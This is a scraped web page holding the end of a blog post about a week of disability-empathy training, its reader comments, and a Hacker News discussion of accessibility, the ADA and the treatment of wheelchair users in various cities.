browser. Is there enough alt-text for you to navigate the web? Switch on subtitles and mute your favourite shows. Do they even have subtitles? What do you miss? Hire or buy a wheelchair for a week. How easy is your office to navigate? (Please don't block the accessible loos though!) Buy a pair of arthritis simulating gloves. What does the world feel like with limited mobility?But, most of all, record how it makes you feel. After a few fruitless hours pleading with my ISP, I was ready to kick something. Now imagine that every day.Whether you work in tech or not - it is your duty to make sure that no one feels demoralised or rejected because of the systems you build.Share this post on… MastodonTwitterFacebookLinkedInRedditHackerNewsLobstersPocketWhatsAppTelegram More posts from around the site: Removing Gmail From An Android Tablet 2014-03-26 Book Review: Disability and the Tudors - All the King's Fools by Phillipa Vincent Connolly 2021-11-23 No Javascript Day 2013-11-08 12 thoughts on “I feel hopeless, rejected, and a burden on society - one week of empathy training” 2019-07-30 12:53Carl-Erik Kopseng says:I was a bit skeptical when reading the headline, but your writing was good. Absolutely a wake up call fo rmany, I think.Reply 2019-07-30 13:17Alex says:Interesting experiment. Thanks for sharing it.I do wonder what kind of a universal system could be implemented for closing your account without voice. I mean, banks are happy to close your account over the phone or whenever you send in a letter. Some let you close it directly from Internet banking.But would those same banks or any other organizational, be willing to do it over live chat? What is the actual roadblock here?Reply 2019-07-30 14:03Hugh says:The bank I work for allows you to close your account in the app or via chat.The roadblock is internal procedure which varies wildly between organizations depending on who regulates them and how regulated they are (if at all) and the ability for processes to change. Often those on the frontline who see the processes failing have no way to change the procedure or pass on feedback that is listened to. Depending on how empowered the organization makes the employee feel they might go away and try to find an alternative, but very often they are tied into following a set procedure which if they deviate from has the potential to get them fired.I'm glad to say my employer doesn't suffer these issues and we can fix broken procedures and make exceptions with relative ease 🙂Reply 2019-07-30 13:28RVKlein says:I really enjoyed this article for reasons I could not fully explain at the moment. Thank you.Reply 2019-07-30 22:04Jo Dowdall says:This is a well written, eye opening blog piece about the challenges faced by disabled people in everyday life. I highly recommend giving it a read Reply 2019-07-31 08:44Caroline Jarrett says:Thank you for trying this.As a personal who has had real (but, it has turned out, temporary) disabilities, you’ve captured some of the frustrations accurately. One of my experiences when I could only walk for short distances with a walking stick and was in constant pain: I was given an award (lovely) at an otherwise accessible conference that I managed by renting a powered scooter chair to get around (expensive). To get the award I had to struggle painfully up some steps into the stage.I’d encourage everyone to try a few temporary disabilities.What you can’t easily replicate is the experience of that disability being relentless and maybe never ending. I didn’t know that my hip replacement would work and I can clearly recall watching someone effortlessly get up out of a chair to walk across the room and wondering what that felt like (I’d forgotten) and whether I’d ever again have that blissful luxury. I can also clearly recall the “spoons” – I’d only got so many spoons of activity available to me each day and I had to plan carefully how and when to use them. And the speed bumps! Every single one was agony.Like I said, I was extremely lucky and my hip transplant worked perfectly. So I’m not claiming in any way that I truly understand a relapsing/remitting, or lifelong, or deteriorating disability.Mostly I think is is a very big “plus one” for your point about listening to what people with disabilities tell us and believing them.Reply 2019-08-01 17:45Helen Keegan says:Oh accessibility is such a minefield. Since spending more time caring for an elderly, partially sighted, partially deaf relative, I have learned so much more about accessibility than I ever did from workshops, seminars or panel sessions. The simplest things become difficult like reading food labels, even with a strong magnifying glass. Opening packets and jars. Using the TV remote control or trying to read the EPG. Using the telephone when you can't see the number to dial. Reading letters from the hospital about appointments or treatments (nothing in large print, even from the eye department!). Turning appliances on and off. Using the oven when you can't read the temperature dial. It's a whole other world. There is no universal fix. But empathy, kindness, common sense and the human touch go a long way to alleviate these day to day obstacles.Reply 2020-07-30 09:53FJ!! says:The web platform I am responsible for and was trying to retrofit the most basic accessibility on, had the effort blocked and in limb for 6 months because my German stakeholders don't think it is necessary and German law doesn't make them.Reply 2022-08-08 07:32 Pingback fromBülten #33: Ürün geliştirmede empati | Üretim Bandı:[…] I feel hopeless, rejected, and a burden on society – one week of empathy training — Hafta hafta farklı engellere sahip olmayı deneyimleyen birinin notları. […]Reply 2023-07-30 18:38Paul Keeble says:The iggest growing disability in te world is Long Covid. At least 60 million people have it, odds are it's 100s of millions in a few years. It's an energy limit disease that makes cognition, walking, the basics of life extremely hard. Healthcare becomes completely inaccessible, you genuinely become too ill to go into a hospital or see a GP and the Doctors leave you to die at home alone. This is an exercise I recommend anyone undertake to see the ugly underbelly of society and how much cruelty people show you. Use a can? Expect someone to kick it out from underneath you. People in wheelchairs get pushed by others everyday, the streetReply 2023-07-30 18:51Paul Keeble says:I can't edit my comments. Typing on a tablet horizontal in bed poses two challenges. I accidentally hit return due to how I have to hold it and autotype butchers my writing very often. Not a problem with an edit button I can fix it after the error but without one my comment is cut short and often unintelligible. Submit on enter combined with no edit is an accessibility issue.Reply 2023-07-30 23:12chaals says:Yep.I was in a wheelchair for a while. And I didn't get a fancy expensive new one. Which is a difference all of its own, even though I was able to do a bunch of work on mine and make it better.I'm so happy when people do fix accessibility stuff - and even more so when they believe people who are explaining what the problem they face is. And correspondingly depressed when I run across organisations that get in the way with inflexible policies compounding the problem they caused by not thinking hard enough in the first place.Reply What are your reckons? All comments are moderated and may not be published immediately. Your email address will not be published.Comment *Name *Email *Website Notify me of follow-up comments by email. Notify me of new posts by email.To respond on your own website, enter the URl of your response which should contain a link to this post. Learn more.Found this post useful? Click the icons to support this blogMore ways to support my blog🔎 Search Search for: Get new posts by emailEnter your email address to subscribe to this blog and receive brand new posts by email. (Or subscribe to this Atom Feed.)Email AddressFree Sign UpJoin 442 other subscribers. Explore The Archives 2023 January 31 posts February 28 posts March 31 posts April 30 posts May 31 posts June 30 posts July 31 posts August   September   October   November   December   2022 January 30 posts February 23 posts March 15 posts April 19 posts May 19 posts June 19 posts July 19 posts August 18 posts September 12 posts October 8 posts November 30 posts December 31 posts 2021 January 31 posts February 28 posts March 31 posts April 30 posts May 31 posts June 30 posts July 31 posts August 31 posts September 30 posts October 31 posts November 30 posts December 31 posts 2020 January 31 posts February 29 posts March 31 posts April 30 posts May 31 posts June 30 posts July 31 posts August 31 posts September 30 posts October 31 posts November 30 posts December 31 posts 2019 January 31 posts February 12 posts March 17 posts April 12 posts May 12 posts June 10 posts July 7 posts August 5 posts September 6 posts October 14 posts November 30 posts December 17 posts 2018 January 8 posts February 4 posts March 6 posts April 14 posts May 5 posts June 6 posts July 6 posts August 13 posts September 14 posts October 8 posts November 30 posts December 4 posts 2017 January 12 posts February 9 posts March 8 posts April 4 posts May 10 posts June 5 posts July 5 posts August 6 posts September 3 posts October 4 posts November 30 posts December   2016 January 10 posts February 10 posts March 11 posts April 9 posts May 8 posts June 9 posts July 6 posts August 9 posts September 4 posts October 2 posts November 30 posts December 14 posts 2015 January 8 posts February 11 posts March 10 posts April 4 posts May 9 posts June 3 posts July 7 posts August 9 posts September 10 posts October 2 posts November 30 posts December 4 posts 2014 January 13 posts February 13 posts March 15 posts April 14 posts May 8 posts June 7 posts July 9 posts August 5 posts September 5 posts October 1 post November 30 posts December 20 posts 2013 January 25 posts February 17 posts March 15 posts April 18 posts May 11 posts June 14 posts July 6 posts August 14 posts September 6 posts October 4 posts November 30 posts December 14 posts 2012 January 14 posts February 8 posts March 13 posts April 15 posts May 10 posts June 16 posts July 8 posts August 8 posts September 6 posts October 6 posts November 30 posts December 31 posts 2011 January 13 posts February 11 posts March 11 posts April 12 posts May 8 posts June 8 posts July 6 posts August 5 posts September 11 posts October 7 posts November 30 posts December 17 posts 2010 January 6 posts February 15 posts March 12 posts April 13 posts May 4 posts June 3 posts July 15 posts August 8 posts September 11 posts October 9 posts November 30 posts December 9 posts 2009 January 1 post February 5 posts March 3 posts April 7 posts May 12 posts June 8 posts July 10 posts August 10 posts September 12 posts October 22 posts November 31 posts December 15 posts 2008 January 2 posts February   March 2 posts April 3 posts May 2 posts June   July 1 post August 3 posts September 1 post October 3 posts November 2 posts December 1 post 2007 January   February   March   April   May   June   July   August   September   October   November 4 posts December 5 posts 2006 January   February   March   April 1 post May   June   July   August   September   October   November 1 post December   2005 January   February   March 1 post April   May   June   July   August   September 1 post October   November   December   2004 January   February   March   April   May 5 posts June 3 posts July 1 post August   September   October   November   December   2003 January   February   March 2 posts April   May   June   July   August   September   October   November   December   2002 January   February 1 post March   April 3 posts May   June   July   August   September   October   November   December   2001 January   February   March   April   May   June   July 1 post August   September   October 1 post November   December   2000 January   February   March 1 post April   May   June   July   August   September   October   November 1 post December   1999 January   February   March   April   May   June   July   August   September 1 post October   November   December 1 post 1997 January 1 post February   March   April   May   June   July   August   September   October   November   December   1995 January   February   March 1 post April   May   June   July   August   September   October   November   December   1987 January   February   March   April   May   June   July   August   September   October   November   December 1 post © Terence EdenContact MeSubscribeCitationsSupport My BlogOn This DayBespoke Computing ConsultancyAbout MeISSN 2753-1570␃␄",
    "commentLink": "https://news.ycombinator.com/item?id=36932524",
    "commentBody": "One week of empathy training (2019) (shkspr.mobi)400 points by willm 22  266 commentsjoker_minmax 22 hours ago | next [–] I do think this is important as an awareness exercise, however, it is worth noting that a lot of the issues CANNOT be seen unless you actually do bring the wheelchair. I learned this in 2018 when as a student I attended a conference with a fellow disabled student in Chicago. I was responsible for pushing her (she could use her arms but it was faster to navigate the city if one of us pushed). Not all train stations have a wide enough platform for wheelchairs to roll across, so your mobility is limited by which stations you can use for the train, which means walking farther from the station to where you actually wanted to go. Accessible hotel room with a pushbutton door shut too quickly for her to get into the threshold. Thankfully one of us was there to hit the button again each time she needed it reopened, but sometimes you had to physically catch and push the (heavier than normal) door before the button would re-open it. If you were just \"thinking\" about being a wheelchair user, and not actually trying to navigate this, you would not have a sense of the timing of this door. Another complication was her foot in a cast sticking out. The lovely, welcoming residents of Chicago catcalled her using wheelchair-related phrases, one guy on the train pointed at her and told her to kill herself, and someone kicked her cast in a crowd. The general attitude toward the disabled, in that environment, is unkind at best.When I was a child (in the US), the science museum in my hometown had an exhibit dedicated to the ADA. You got into a wheelchair and tried to do tasks. It showed how payphones at a certain height are too high to reach, how difficult it would be to go up a ramp with an unapproved slope, etc. I wonder if it's still there, because that was my first foray into thinking this way. The Chicago trip however, basically radicalized me.The article has a reference point of the UK and I don't know what their laws are with regards to accessibility. But it's clear that in both countries public attitudes toward accessibility have a very long way to go. And I'm sure most other countries can say this as well.replyblahedo 20 hours ago | parent | next [–] > in Chicago. ...And the sad thing is, in this respect Chicago is less bad than a lot of other towns and cities in the US and way less bad than many (most?) cities in other countries, including many that are much more progressive than the US. Chicago has been working on curb cuts for years and is in the midst of a years-long quest to upgrade all El (metro/subway) platforms for accessibility, and the ADA---33 years old---has much stronger requirements than, as far as I can tell, even current legislation elsewhere. In Canada, France, Spain, Germany I've seen whole rows of storefronts that are a half-storey up or down from street level, curb cuts are rare, and it's more usual for stores and other business to have steps than not. In other realms of accessibility, I've also noticed a lot more Braille and/or headphone access on ATMs and public kiosks in the US, and fire alarms that are rigged with lights as well as sound.It's not a perfect mechanism, and the US gets a lot of other things wrong, but the ADA is something we got really, really on the right track (and keep improving).replyAnthonyMouse 9 hours ago | root | parent | next [–] I kind of wonder if we're not solving a lot of these problems in the wrong place. We passed a law that requires buildings to change, but meanwhile we have the technology to make \"wheelchairs\" that can climb stairs. Something with a continuous track or whatever else human ingenuity can devise.That would cost money, but how could it possibly cost as much as modifying every building everywhere? A wheelchair ramp is thousands of dollars. An elevator is hundreds of thousands. A person in a wheelchair might encounter a thousand distinct sets of stairs in a year but the median set of stairs doesn't encounter that number of distinct people in a wheelchair.More importantly, there are stairs in places we're not going to do anything about it, like old buildings and private homes. And there are accessibility devices that become inaccessible, e.g. an elevator that can't be used because the power is out or the building is on fire. A solution that still works in those cases is better.As far as I can tell we got stuck with the existing one because of politics. The per-person cost of a ramp at a large high volume business is negligible because it has so much traffic, so much so that they'd install one regardless. The real cost is putting them in every small shop and low traffic area. But then you have no opposition from large businesses to a law requiring them because it puts a disproportionate cost on their smaller competitors. Whereas a tax that paid for more capable \"wheelchairs\" would sensibly be paid mostly by those large companies, and then they object.replyStockHuman 3 hours ago | root | parent | next [–] Physical changes to building codes and infrastructure have benefited not just those on wheelchairs, but just about everyone else with a wheeled thing for any other purpose. Parents pushing prams and strollers, people moving bikes into parking spots, carrying groceries with wheeled carriers, using mobility scooters, etc.As others have mentioned: no, it’s the right tack; permanent changes to the built world benefit many and survive whatever byzantine rules might come in place to receiving high-tech wheelchairs from insurance or otherwise.replyCentigonal 9 hours ago | root | parent | prev | next [–] I once had a job where I listened to calls to a major US health insurance carrier. The amount of grief that people (especially retirees on privately administered medicare) go through to get a claim for a new wheelchair approved can be enormous. If we want to give disabled people better & more expensive medical equipment as a substitute for accessible buildings, we need to fix the system that is depriving many of new or replacement versions of the \"dumb\" mobility aids that are in wide use today.replyAnthonyMouse 5 hours ago | root | parent | next [–] But this is just the politics again. If a government program is paying tax money to people with a particular condition then they should just have a table that says how much money it's expected to cost and give you that money to use for whatever you want. Presumably you'll use it to buy an accessibility device, because you need one, which is why you got the money -- but you shouldn't be excluded from using it for something that functions as an accessibility device even if it isn't on some specific list, or devising your own and using the money to buy components.Only if they did that there wouldn't be any middle men making rules for who gets denied or which company's products you have to buy, so they would be exposed to competitive pressure and have to make better stuff for slimmer margins. Which the existing system is designed to prevent, because politics.replysizzle 8 hours ago | root | parent | prev | next [–] Went through this with parents, ended up paying for a wheelchair for $500 myself from the manufacturer. I hate Medicare denying disabled stroke patients with a passion now.replyWWLink 6 hours ago | root | parent | prev | next [–] Those tractor wheelchairs are not a fits-all solution! For one, they're huge and heavy. For another, I would assume they won't work well on irregular stairways or antique stairways.Honestly, I'll make an insane hot take here: I think historic/antique buildings that can't be made ADA compliant shouldn't be used for anything important. Or rather, that they should be modified to accommodate.History is important TO A DEGREE. Helping human beings feel more a part of society is more important.replyAnthonyMouse 5 hours ago | root | parent | next [–] > For one, they're huge and heavy.So make one that isn't. There is nothing in them that has to be made out of depleted uranium.> For another, I would assume they won't work well on irregular stairways or antique stairways.How is that any worse than the status quo? If you have something that can navigate stairways then it will work on some of the structures which are old and currently inaccessible, as opposed to none of them as it is now.> Honestly, I'll make an insane hot take here: I think historic/antique buildings that can't be made ADA compliant shouldn't be used for anything important. Or rather, that they should be modified to accommodate.In many cases this is impossible without taking a wrecking ball to the existing structure and even when it is possible it will commonly be prohibitively expensive because it requires extensive bespoke professional engineering instead of off the shelf commodity products. You're essentially asking for all the old buildings to be torn down, which would not only be the destruction of history but have an extensive economic cost and exacerbate the existing real estate shortage.It might literally be less expensive to give everyone in a wheelchair a personal flying car.replyjoker_minmax 18 hours ago | root | parent | prev | next [–] Well the old famous pizza places are not accessible in the slightest. Basically anything super freaking old is a lost cause unless you magically have room to make the bathrooms bigger or put an extension on the storefront, etc. I'm from the South, and it also shocked me how cars in Chicago would basically inch directly up to where you're walking, like they're just gonna run over you if you stopped, even if pedestrians technically have the green to cross. And they could see we were going slower because we're pushing a wheelchair! People talk crap on the South and how we drive, but at least we usually slow down when someone is crossing. (I can't vouch for Florida, but most of Florida doesn't count as Southern anyway.)It's easy to take the braille in elevators or lights on fire alarms for granted, but thanks for pointing out how good it is that we have them.replytssva 16 hours ago | root | parent | next [–] > and it also shocked me how cars in Chicago would basically inch directly up to where you're walking, like they're just gonna run over you if you stopped, even if pedestrians technically have the green to cross.I just spent the last week in downtown Chicago and in this regard I didn't find it any worse than the downtown areas of other major cities. Not saying it is acceptable but Chicago is not an outlier.replyTylerE 11 hours ago | root | parent | prev | next [–] Many of the subway stations in NYC still don't have elevators, and when they do they're usually far from the platform, slow, and smelly.I'm not even in a wheel chair, although I do have foot and nerve issues that can make stairs rather treacherous so I usually avoid them when possible. Like, I live in a 3 story house with stairs, and it's fine, but on possibly slick concrete or tile, with many other people around me (usually going faster)...that's something I avoid when possible.replygurchik 10 hours ago | root | parent | next [–] I've noticed this as well. It depends on where you live, but in Brooklyn, almost none of the subway stations are wheelchair accessible. Buses are, and there are many free transfer options from the subway into the bus network, but in my experience living in NYC the buses are very unreliable. You can get to where you're going but half the time the bus you need will not arrive.Just for fun I looked at a couple subway lines in Brooklyn. Very few wheelchair accessible stops:- F train: 3 of its 22 stops- G train: 2 of its 19 stops (a historically neglected line, but still I'm surprised to see this so low)- A train: 3 of its 17 stops... in fact, lets play a game. Here's a map I made of part of Brooklyn. The stars represent stops that are not wheelchair accessible. Can you find the stops that don't have a star? https://imgur.com/a/8PdzrOKreplyTylerE 9 hours ago | root | parent | next [–] When I visited this year I never got out of lower/midtown Manhattan and it was 50/50 at best.replykortilla 10 hours ago | root | parent | prev | next [–] > And the sad thing is, in this respect Chicago is less bad than a lot of other towns and cities in the USBeing a “progressive” city isn’t really correlated with being disability friendly. New York is terrible for disabilities. Many walkable and high dense areas are also terrible for them.Like it or not, suburbia with giant parking lots, dedicated disabled spaces, wheelchair ramps, etc is about the best access you can get (assuming you can drive a vehicle and have one).replyHWR_14 9 hours ago | root | parent | next [–] Or, new construction in general is more disability friendly. Historic construction isn't, and usually only has to update on renovations.replyHWR_14 11 hours ago | root | parent | prev | next [–] As I understand it, the ADA is one of those occasions where the US government leads the world in protecting its citizens.replygiraffe_lady 20 hours ago | root | parent | prev | next [–] A lot of this is undone by unofficially allowing parking in crosswalks and other routine \"transgressions\". The cutouts don't matter when there's a car over it. So many groups are affected by this other than wheelchair users too: parents with strollers, elderly or disabled with walkers or who simply can't lift their foot high enough to step onto a curb, young children on balance bikes or skates.The enforcement mechanism of ADA being, literally, \"sue us\" is an absolutely massive barrier that makes its practical efficacy a fraction of what you'd think it is based on reading the rules.replyneltnerb 17 hours ago | root | parent | next [–] I have spent four years, typically ~2 months a year between first complaint and it actually getting acted upon, getting Somerville to cut overgrowth from its own construction site that completely block a sidewalk that is used by hundreds of people per day (there is no sidewalk at all on the other side).You couldn't use the sidewalk anyway as it is not ADA compliant in the slightest (random light posts in the middle of a half width sidewalk with tons of cracks and holes). But at least it should be vaguely passable...Meanwhile literally 100 feet away they managed to redesign and repave an entire highway onramp without hiring a groundskeeper for their own property.I hate having to bring up the ADA as the reason the city should respect pedestrians. They spent how much money on that highway onramp but can't be bothered to make the frontage on property it owns usable by pedestrians?replyTylerE 11 hours ago | root | parent | next [–] Highways are managed by the state DOT, not the city.replyneltnerb 10 hours ago | root | parent | next [–] Oh boy, do I know... they say it's a city thing because the site is owned by the city or used for city construction or something. It's convoluted as you would expect. 311 and the state DOT disagree about who is responsible for no reason a mere citizen can navigate. It's a long and boring post.An aside in any case.A completely blocked and nearly useless sidewalk shouldn't be a thing that requires a resident to file a complaint just the right way to get fixed. Especially when it's in an easily visible area. Something being \"compliant\" isn't enough, and even publicly managed sites aren't necessarily compliant (and shouldn't take a lawyer to fix).It's not asking a lot for a site run by a construction company to find a groundskeeper for a few hours a year without figuring out just the right way to complain first. When the same sites were owned by a private company it went without saying.replyirrational 9 hours ago | root | parent | prev | next [–] My city has been on a curb cut rampage recently. Pretty much every single corner, whether in a suburban neighborhood or downtown, has been ripped out and replaced with an ADA ramp that is bright yellow with these bumps on it.replydustincoates 21 hours ago | parent | prev | next [–] Having children and, thus, a stroller, has given me some small level of insight into what it must be to try and navigate Paris in a wheelchair.I can only think of one, maybe two, Metro stations that I can access with my youngest without carrying him. Many stores I would not be able to enter if I wasn't able to tip the wheels up. Curb cuts are routinely blocked by tourist scooters and anyway people often take up too much of the space on the sidewalk with their vehicles to get through. Add on to the fact that apartment stock must be 95% inaccessible if you're in a wheelchair.It might be why I have only twice seen someone in a wheelchair in my seven years here. My wife and I have discussed before that, as much as we love it here, we'd move out right away if any of us had accessibility needs.replyhgomersall 20 hours ago | root | parent | next [–] I got this too. Another thing I notice is how common it is to block pavements with whatever - vehicles, bins, general street furniture, whatever.Normally when I suggest a driver doesn't park on a pavement I get a grumpy dismissal, though I once suggested it to a DHL driver who immediately got my point and moved. That was refreshing.replylostlogin 19 hours ago | root | parent | prev | next [–] The quality of the pavement matters a lot too.I once pushed my daughter’s pram down a path and hit the front of the next slab, and stopped dead. I’d not done her up and she shot out and was caught by the mesh of the sun shade. Lesson learned, belt them in.replyAeolun 9 hours ago | root | parent | next [–] I’m fairly certain every parent does this at least once.Hopefully only once.replyrenox 19 hours ago | root | parent | prev | next [–] Yes, I'm French too and when I was on holiday in Thailand, in a mall I noticed that there were people in wheelchairs shopping, my first thought: in France they wouldn't be able to be here because the accomodations are so bad..It's not 100% true and it's improving but very, very slowly..replygumby 18 hours ago | root | parent | prev | next [–] There's a technology issue too: my German in laws gave us a baby carriage that seemed to have been built for ascending the Eiger -- though it seemed (and was) huge it made navigating Paris quite easy (had to carry it up/down the metro steps) and even fit in the prehistoric elevator in our apartment building. Frankly, supposedly-snooty parisians are quite accommodating towards people with babies (once they can walk on their own though...)But I never saw anything like that in the parisian baby shops.I agree though about unattended obstacles on the trottoir -- it's as if people forget they need to use them themselves.replyplufz 21 hours ago | root | parent | prev | next [–] Being a swede that sounds surprising. Does France not have regulations for accessibility in public spaces?replyjacquesm 19 hours ago | root | parent | next [–] Paris is ancient and built on a bunch of hills, there are quite a few places where retrofitting the city to make it more accessible would be easier by rebuilding the whole thing than by making changes and that's not going to happen. Amsterdam has an easier time of it, not quite as old, though old enough that that isn't a big factor in the difference, the good bit is that it is mostly flat (other than the canal bridges, some of which can be pretty steep). Even so there are areas of the inner city that would be hard to navigate in a wheelchair.replyvarjag 19 hours ago | root | parent | next [–] Stockholm wasn't exactly built last year either.replyjacquesm 19 hours ago | root | parent | next [–] True, but like Amsterdam it is mostly flat, right?replyapelapan 18 hours ago | root | parent | next [–] Having lived in both Stockholm and Amsterdam, I can assure you that Stockholm is not at all flat like Amsterdam!No idea about how easy either city is to get around with a wheelchair. Pushing a fully loaded double-stroller is no problem for an average-sized, ablebodied adult in any of them.replyvarjag 6 hours ago | root | parent | prev | next [–] Hard to tell for me, after decades in Bergen my sense of what people consider hilly is skewed.replyRexxar 3 hours ago | root | parent | next [–] Just the name of this city is an indicationreplygochi 20 hours ago | root | parent | prev | next [–] That's a great alternative measure, especially those wide strollers!replybombcar 11 hours ago | root | parent | next [–] A double-wide stroller really makes you aware of exactly how wide doors are, even ones with automatic openers.The easy way to measure things - if you couldn't barely squeeze a Jeep into the space, you're going to have a hard time maneuvering a wheelchair or doublewide stroller.replyThePowerOfFuet 20 hours ago | root | parent | prev | next [–] The RATP should be ashamed of themselves with the poor accessibility of the Paris metro. Barcelona's metro isn't that much older but is almost 100% accessible.replyblahedo 11 hours ago | root | parent | next [–] Wasn't Barcelona's metro mostly either new or newly rebuilt as of 1992? Spain may not have had an ADA equivalent at that point requiring great accessibility at that time, but that's still way different than all the century-old Paris metro lines.reply13of40 21 hours ago | parent | prev | next [–] > The lovely, welcoming residents of Chicago catcalled her using wheelchair-related phrases, one guy on the train pointed at her and told her to kill herself, and someone kicked her cast in a crowd.Dear god. My wife broke her leg about a month ago, and I've been pushing her in a wheelchair when we go out. The spectrum of reactions so far has run from a quick smile to strangers coming up to ask what happened and wish her well. This is in the eastern Seattle suburbs. WTF, people?replyjoker_minmax 18 hours ago | root | parent | next [–] As I've said in a different reply, the KYS guy was definitely on drugs - his demeanor was abnormal even before he opened his mouth. And every city will have characters of that type. But the other people were just average run-of-the-mill folks from afar who decided to make her day worse.replycode_duck 10 hours ago | root | parent | next [–] A few years ago I was discussing my health problems with a group of vague colleagues and someone told me that because I have Celiac disease and type 1 diabetes, I should kill myself. I don’t even remember who it was who told me that, but now and then I ponder what sort of insensitive attitude one would have to make that suggestion. To me it makes them sound rather inflexible and weak. It’s actually something people say commonly in relation to Celiac, that if they couldn’t eat generic pizza or burgers, they would rather simply die. I wager that if put to the test, these people would not choose to end their lives if they had to be careful and selective about food. It makes me wonder, is eating some junk food really the only reason they have to live?replyjoker_minmax 2 minutes ago | root | parent | next [–] Ironically, the disabled student I went to Chicago with, was Celiac as well. We actually had such a fun time finding Celiac-friendly places to eat, and I enjoyed trying new forms of familiar foods. The one advantage to going to a huge city is that there WERE Celiac-friendly places, and the smaller city I lived in at the time had nothing dedicatedly GF. I'm sorry there are people who said that to you. It's disheartening how people can't think outside the box and realize if human beings are creative enough to build the Coliseum and the Great Wall, we can figure out a way to make a gluten-free version bread. Might not be exactly the same as wheat, but it's decent, and we're innovating all the time. I wish you a flourishing life!Aeolun 9 hours ago | root | parent | prev | next [–] > is eating some junk food really the only reason they have to live?I doubt it. But it’s probably high on the list of things they would miss most.Not being able to walk, meh. Not being able to eat pizza?!replycode_duck 6 hours ago | root | parent | next [–] Gluten free pizza does exist and is perfectly adequate to me. Certain styles of crust work great (gf ingredients are good for making something crispy, but not so much doughy and chewy). But yeah, specific pizza or other people’s pizza is out of bounds. It’s very inconvenient, but not total doom.replywutbrodo 20 hours ago | root | parent | prev | next [–] I was surprised to hear GP's story about the Midwest, but not surprised to hear an anecdote of West Coasters being kinder to strangers than elsewhere.Any one of those stories is worse than anything I've experienced in decades of living in large California citiesreplyno_wizard 9 hours ago | root | parent | next [–] Culturally Chicago has more in common with NYC than it does it’s Midwest neighborsreplybombcar 11 hours ago | root | parent | prev | next [–] Chicago isn't the midwest, we disavow it.replyjoker_minmax 14 hours ago | parent | prev | next [–] I don't see an edit button for my comment anymore so I'm just going to add the following thought: remember that no one is immune to disability. One small slip-and-fall, one other careless driver on the road with you, one infection, etc is all it takes and suddenly you've got to struggle through life to make anything work. That is why this is important: it could be you or anyone you know, and happen at any time. Even if you feel invincible.replybombcar 11 hours ago | root | parent | next [–] And it doesn't even have to be you; just someone you live with, or help, etc.Having two kids in a stroller could put you almost there (if you have only two kids, get an inline stroller as it's much easier even though longer). Once you're at three and have to get a Zoe you're going to learn quite abit about ADA accessibility.https://zoebaby.com/products/zoe-trio-triple-stroller?varian...replyeverfree 7 hours ago | root | parent | prev | next [–] > One small slip-and-fall, one other careless driver on the road with you, one infection, etc is all it takes and suddenly you've got to struggle through life to make anything work.Or just over time. Everyone gets there by their 80s or 90s, if they're lucky.replyadhesive_wombat 7 hours ago | parent | prev | next [–] The UK has, in absolute terms, rather poor accessibility. Maybe better then many places, and the law is allegedly on the right side, but in practice you don't want to rely on anything in particular being accessible without scoping it out first.I used a wheelchair for one day, and after nearly killing myself trying to get over kerb on a slope (from the hospital car park to the hospital), resolved to use under-armpit crutches instead. It's a rare thing that makes you feel privileged to be able to use those painful things!Trains are a good recent example. Most trains are extremely inaccessible, with a foot or two of steps up into the carriage and a large, famously announced, gap. There are wheelchair ramps on platforms but you need to find staff to unlock and use them, or telephone ahead. They're about to remove thousands of ticket offices, so there may soon be no one there. Then when you get onto the station, if the lifts don't work, you'll be stuck on the platform. Assuming they have lifts. My local station doesn't have them at all. If I was in a wheelchair, I'd consider trains a complete no-go zone.Most buses near me are able to \"kneel\" and have wheelchair ramps, thankfully.Many commercial buildings in cities and suburbs are haphazardly shoved into old housing stock, so it's quite likely that at many places you will have several flights of stairs to deal with. If I'd been in a wheelchair, I'd have been unable to access the office at my first job, for example: four flights of stairs and a step at the door.I sometimes wonder if we as a society will end up actually curing all disabilities before making public things universally accessible.replybowsamic 6 hours ago | root | parent | next [–] > The UK has, in absolute terms, rather poor accessibility.It is certainly far better than here in Germany, as is the awareness. I was shocked visiting the UK just how many disabled people were on TV. Presenters of shows, in almost a half of adverts, etc. were in wheelchairs or had severe physical disability. Here in Germany disabled people are still considered to be undesirables and are hidden from public sight. For whatever reason, I do not even see disabled people in public here, whereas in the UK I see a lot of people moving around with mobility issues.So while it is bad, do not get the impression that it is far better in the European countries that one might expect it to be better in. Certainly the awareness and tolerance is significantly better in the UK.replyWWLink 6 hours ago | root | parent | next [–] > I was shocked visiting the UK just how many disabled people were on TV. Presenters of shows, in almost a half of adverts, etc. were in wheelchairs or had severe physical disability.In the US, I have NEVER seen such a thing. Except maybe in commercials for medicine. or retirement-related things.That would be pretty cool to see.replydefrost 6 hours ago | root | parent | next [–] If you poke about on torrents, streaming, using a geo proxy etc. you can likely watch The Last Leghttps://en.wikipedia.org/wiki/The_Last_Lega British late-night television humorous talk/sketch show that originally ran alongside the 2012 Summer Paralympics every night following the main coverage on Channel 4.Anchored by Australian comedian Adam Hills and co-hosted by Josh Widdicombe and Alex Brooker, it gives a review of the week's events.Featuring a mix of comedy, guests and Paralympics highlights, the show received strong reviews and regularly pulled in more than a million viewers each night of the Paralympic Games.It has since become a weekly show giving a humorous alternative look back at the week's events. Outside of the UK, the show is broadcast in Hills' native Australia by the ABC... described by main presenter Adam Hills as \"Three guys with four legs talking about the week\"https://www.channel4.com/programmes/the-last-legreplybowsamic 6 hours ago | root | parent | prev | next [–] Yeah I was pretty shocked. The first one I pointed out my wife was like \"yeah? so what?\" but on the fourth TV show we saw hosted by someone in a wheelchair it was undeniablereplytehwebguy 21 hours ago | parent | prev | next [–] Brutal. Referring back to this comment the next time folks here are indignant about ADA private right of action.replypnw 11 hours ago | root | parent | next [–] You can be indignant about the weaponization of the ADA by attorneys driven by a profit motive, and still respect the intent of the ADA.replytiffanyg 20 hours ago | parent | prev | next [–] You're hitting on some extremely key insights IMO. Insights grounded in abstract fundamental principles useful all the way from the \"hardest\" of sciences (physics and even maths, arguably, as a formal science) to the much \"softer\" (human psychology etc. - where it's far more difficult to be directly quantitative for a whole host of reasons).First, when it comes to engineering, the absolute best test is running the actual system. The \"acid test\" of a rocket is the launch of that rocket. And, even for all of our \"computer-aided engineering\" progress over the decades, a wind tunnel is still often a key step and can provide \"better\" and more reliable info regarding some characteristics of, say, rocket body shape performance, than Pro/ENGINEER or etc. can*. So, the best test when it comes to ADA-related issues is to engineer yourself, to the degree possible, into the position of someone with a \"disability\". The best work in these areas has involved people tying their limbs down etc. - because, even if you consciously work to not use one arm, say, you'll still involuntarily use it in many ways. For example, it'll naturally come up slightly to help regain balance in some situations.Second, and this is actually, I'd argue, simply a more complete perspective partly covered just above - understanding critically depends on the degree to which one can be in some \"position\". Often enough, our minds can be adequate. In particular, we can \"understand\" abstractions that can't necessarily even have obvious \"instantiations\" - e.g., mathematical 